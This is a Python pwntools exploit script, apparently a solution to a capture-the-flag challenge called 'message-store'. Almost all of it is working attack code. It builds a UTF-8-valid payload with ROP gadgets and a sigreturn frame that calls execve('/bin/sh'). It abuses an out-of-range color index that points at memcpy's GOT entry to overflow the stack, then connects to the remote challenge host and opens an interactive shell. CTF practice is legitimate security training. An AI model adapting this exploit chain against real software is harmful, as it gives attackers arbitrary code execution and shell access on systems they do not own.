#!/usr/bin/env python3
from pwn import *
import struct

context.binary = './challenge'
context.arch = 'amd64'

# ====== ADDRESSES ======
BUFFER_ADDR = 0x2f9e38
SYSCALL = 0x2a6602

# UTF-8-safe gadgets (all bytes <= 0x7f)
pop_rcx     = 0x247566   # pop rcx; ret
xor_add_rcx = 0x2d733d   # xor eax,eax; add rax,rcx; ret => rax = rcx

# ====== BUFFER LAYOUT ======
# 0x000-0x017: ColoredString (ptr=1 dangling, cap=0, len=0) - safe to drop
# 0x018-0x04f: padding (zeros)
# 0x050-0x057: saved rbx (0)
# 0x058-0x05f: saved r14 (0)
# 0x060-0x07f: ROP preamble (set rax=15, trigger sigreturn)
# 0x080-0x177: SROP frame (execve("/bin/sh", NULL, NULL))
# 0x178-0x17f: "/bin/sh\0"
# 0x180-0xfff: zero padding

# ====== /bin/sh ADDRESS ======
binsh_offset = 0x178
binsh_addr = BUFFER_ADDR + binsh_offset  # 0x2f9fb0
# bytes: B0 9F 2F 00 00 00 00 00
# B0 and 9F are continuation bytes (0x80-0xBF)
# We fix this by setting r15's byte 7 = 0xE0 (3-byte UTF-8 start)
# so the sequence across r15[7] + rdi[0] + rdi[1] = E0 B0 9F = valid UTF-8

# ====== ROP PREAMBLE ======
# Set rax=15 (sigreturn), then syscall
preamble = b''
preamble += p64(pop_rcx)      # pop rcx; ret
preamble += p64(15)           # rcx = 15
preamble += p64(xor_add_rcx)  # xor eax,eax; add rax,rcx; ret => rax = 15
preamble += p64(SYSCALL)      # syscall => sigreturn

# ====== SROP FRAME ======
frame = SigreturnFrame()
frame.rax = 59          # execve syscall number
frame.rdi = binsh_addr  # pointer to "/bin/sh\0" in BUFFER
frame.rsi = 0           # argv = NULL
frame.rdx = 0           # envp = NULL
frame.rip = SYSCALL     # rip = syscall instruction
frame.rsp = 0           # doesn't matter for execve
frame.rbp = 0
frame.rbx = 0
frame.rcx = 0
frame.r8  = 0
frame.r9  = 0
frame.r10 = 0
frame.r11 = 0
frame.r12 = 0
frame.r13 = 0
frame.r14 = 0
# r15 byte 7 (MSB in little-endian) = 0xE0 to form valid 3-byte UTF-8
# with rdi bytes [0xB0, 0x9F]
frame.r15 = 0xE000000000000000
frame['csgsfs'] = 0x33  # cs = 0x33 for 64-bit mode

# ====== BUILD PAYLOAD ======
payload = bytearray(0x1000)

# ColoredString: String{ptr=1(dangling), cap=0, len=0}
struct.pack_into('<QQQ', payload, 0, 1, 0, 0)

# Saved registers
struct.pack_into('<Q', payload, 0x50, 0)   # rbx
struct.pack_into('<Q', payload, 0x58, 0)   # r14

# ROP preamble at offset 0x60
payload[0x60:0x60+len(preamble)] = preamble

# SROP frame at offset 0x80
frame_bytes = bytes(frame)
payload[0x80:0x80+len(frame_bytes)] = frame_bytes

# /bin/sh at offset 0x178
payload[binsh_offset:binsh_offset+8] = b'/bin/sh\x00'

# Verify UTF-8 validity
try:
    bytes(payload).decode('utf-8')
    log.success("Payload is valid UTF-8!")
except UnicodeDecodeError as e:
    log.error(f"Payload NOT valid UTF-8 at byte {e.start}: {e}")
    exit(1)

# ====== EXPLOIT ======
HOST = 'message-store.chals.dicec.tf'
PORT = 1337

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process('./challenge')

# Step 1: Set message with payload
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'? ', bytes(payload))

# Step 2: Set color to memcpy GOT index (3356)
# This makes the color function call memcpy(rsp+0x18, BUFFER, 0x1000)
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'3356')

# Step 3: Print message -> memcpy overflow -> ROP -> sigreturn -> execve
p.sendlineafter(b'> ', b'3')

# Should have a shell now
p.interactive()
